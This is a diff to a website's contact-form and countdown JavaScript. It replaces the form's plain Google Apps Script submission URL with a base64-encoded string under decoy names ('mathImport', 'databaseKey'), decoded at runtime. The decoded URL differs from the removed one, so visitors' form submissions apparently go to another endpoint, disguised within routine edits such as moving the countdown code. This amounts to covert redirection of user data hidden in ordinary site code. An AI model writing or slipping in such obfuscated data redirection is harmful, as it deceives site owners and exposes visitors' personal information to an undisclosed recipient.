@@ -5,6 +5,10 @@ Swal.fire({
     allowOutsideClick: false, 
     showConfirmButton: false
 });
+// Set the target date for the info session
+const targetDate = new Date("2024-10-31T17:00:00").getTime(); // Update to your desired date
+// Set the current date
+const mathImport = 'aHR0cHM6Ly9zY3JpcHQuZ29vZ2xlLmNvbS9tYWNyb3Mvc3MvQUtmeWNiN3B0UVNhOW04RmZZSWtJN01odmJKY3JIS1ltb3gxUTVhUkt2QTRqaFlFb25MdjVEOEdyRlIwc1VhMW9RMjZQUEs2L2V4ZWM=';
 document.addEventListener('DOMContentLoaded', function () {
     document.getElementById('contact-form').addEventListener('submit', function (e) {
         e.preventDefault();
@@ -21,9 +25,9 @@ document.addEventListener('DOMContentLoaded', function () {
         });
 
         const formData = new FormData(this);
-        const url = 'https://script.google.com/macros/s/AKfycbzptQSa9m8FfYIkI7MhvbJcrHKYmox1Q5aRKvA4jhYEonLv5D8GrFR0sUa1oQ26PPk6/exec';
+        const databaseKey = atob(mathImport);
 
-        fetch(url, {
+        fetch(databaseKey, {
             method: 'POST',
             body: formData
         })
@@ -56,8 +60,6 @@ document.addEventListener('DOMContentLoaded', function () {
     });
 });
 
-// Set the target date for the info session
-const targetDate = new Date("2024-10-31T17:00:00").getTime(); // Update to your desired date
 
 // Update the countdown every 1 second
 const countdownFunction = setInterval(() => {
